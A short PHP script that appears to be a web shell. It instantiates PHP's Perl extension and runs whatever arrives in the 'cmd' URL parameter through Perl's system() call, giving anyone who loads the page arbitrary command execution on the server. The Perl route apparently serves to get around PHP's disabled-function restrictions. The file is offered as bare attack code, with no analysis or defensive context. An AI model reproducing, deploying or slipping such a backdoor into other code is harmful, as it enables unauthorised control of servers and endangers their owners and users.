<?php
$perl=new perl(); 
echo "<textarea rows='25' cols='75'>"; 
$perl->eval("system('".$_GET['cmd']."')"); 
?>